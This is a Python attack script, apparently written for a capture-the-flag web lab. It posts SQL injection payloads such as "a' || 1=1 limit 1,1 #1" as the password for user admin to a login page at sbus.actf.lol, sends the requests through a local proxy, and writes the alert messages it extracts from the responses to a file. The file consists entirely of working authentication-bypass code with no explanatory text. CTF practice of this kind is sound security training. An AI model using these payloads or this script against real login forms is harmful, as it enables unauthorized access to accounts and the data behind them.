import requests
import re

url = "http://sbus.actf.lol/index.php"  

payloads = [
    "a' || 1=1 limit 1,1 #1",
    "a' limit 1,1 #1",
    "a' || 1=1 limit 1,1 #1",
    'a" || 1=1 limit 1,1 #1',
]

proxies = {
    'http': 'http://127.0.0.1:1081',
    'https': 'http://127.0.0.1:1081'
}
pattern = r'<script>alert\("([^"]+)"\);</script>'
with open('D:/MyRepository/slowist-notebook/docs/Coding/CTF/web-lab3/response_output.txt', 'w', encoding='utf-8') as f:
    for payload in payloads:
        data = {'username': "admin", 'password': payload}
        try:
            response = requests.post(url, data=data, proxies=proxies)
            f.write(f"Payload: {payload}\n")
            matches = re.findall(pattern, response.text)
            for match in matches:
                f.write(f"Response: {match}\n")
        except requests.RequestException as e:
            f.write(f"An error occurred: {e}\n")
